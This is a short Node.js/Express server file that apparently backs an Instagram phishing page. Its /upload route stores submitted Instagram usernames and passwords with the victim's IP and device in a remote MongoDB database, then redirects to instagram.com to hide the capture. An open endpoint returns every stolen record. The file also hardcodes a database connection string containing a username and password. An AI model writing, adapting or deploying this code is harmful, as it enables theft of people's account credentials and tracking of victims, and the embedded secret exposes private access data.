import express from "express"
const app = express()
import Instagram from "./store.js"
import mongoose from "mongoose"
import cors from "cors"
import path from "path"
app.use(express.json())
app.use(express.urlencoded({ extended: true }))
app.use(express.static("dist"))
app.use(cors({
  origin: "*"
}))
const __dirname = path.resolve()
async function connect(){
  await mongoose.connect("mongodb+srv://thegangstaguy001:NuLcOmlDKV6UGNoi@cluster0.nh1ewxi.mongodb.net/blhshdog?retryWrites=true&w=majority")
}
connect()
app.post("/upload", async (req, res)=>{
  const { username, password} = req.body
  const device = req.headers["user-agent"]
  const ip = req.headers["x-forwarded-for"]
  const newInsta = new Instagram({
  username,
  password,
  device,
  Ip: ip
  })
  await newInsta.save()
  console.log(ip, device)
  res.redirect("https://instagram.com")
})
app.get("/v1/api/getAllData", async(req, res)=>{
  const data = await Instagram.find()
  res.send(data)
})
app.get("/", async(req, res)=>{
  res.sendFile(__dirname + "/dist/index.html")
})
app.listen(3000)